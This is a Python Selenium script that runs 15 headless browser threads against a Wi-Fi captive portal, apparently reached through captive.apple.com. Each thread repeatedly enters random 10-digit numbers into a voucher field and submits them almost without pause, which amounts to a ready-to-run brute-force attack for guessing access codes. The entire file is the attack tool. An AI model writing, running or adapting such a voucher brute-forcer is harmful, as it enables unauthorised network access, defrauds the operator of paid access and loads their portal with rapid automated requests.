import time
import random
import threading
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Configuration
CHROMEDRIVER_PATH = '/Users/vonuyvico/Downloads/chromedriver-mac-arm64/chromedriver'
TARGET_URL = 'http://captive.apple.com'
THREAD_COUNT = 15


def generate_num(length=10):
    """Generate a random numeric string of given length."""
    return ''.join(str(random.randint(0, 9)) for _ in range(length))


def worker(thread_id):
    """
    Worker function for each thread: spins up its own WebDriver,
    navigates to the target, and continuously sends random numbers.
    """
    print(f"[Thread {thread_id}] Starting WebDriver...")
    service = Service(executable_path=CHROMEDRIVER_PATH)
    options = webdriver.ChromeOptions()
    options.add_argument('--headless=new')
    driver = webdriver.Chrome(service=service, options=options)
    driver.get(TARGET_URL)

    try:
        while True:
            # Generate random input and clear field
            random_number = generate_num()
            input_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, '.voucher-input-classname'))
            )
            # Clear existing value
            current_value = input_field.get_attribute('value')
            for _ in range(len(current_value)):
                input_field.send_keys(Keys.BACKSPACE)
            # Enter new random value
            input_field.send_keys(random_number)
            print(f"[Thread {thread_id}] Input: {random_number}")

            # Click the button
            button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[type=button]'))
            )
            button.click()
            print(f"[Thread {thread_id}] Button clicked")

            # Small delay to avoid hammering too fast
            time.sleep(0.01)
    except KeyboardInterrupt:
        print(f"[Thread {thread_id}] Interrupted by user.")
    finally:
        driver.quit()
        print(f"[Thread {thread_id}] WebDriver closed.")


def main():
    threads = []
    for i in range(THREAD_COUNT):
        t = threading.Thread(target=worker, args=(i,))
        t.daemon = True
        threads.append(t)
        t.start()

    print(f"Started {THREAD_COUNT} threads. Press Ctrl+C to stop.")

    try:
        # Keep the main thread alive to catch KeyboardInterrupt
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[Main] Stopping all threads...")


if __name__ == '__main__':
    main()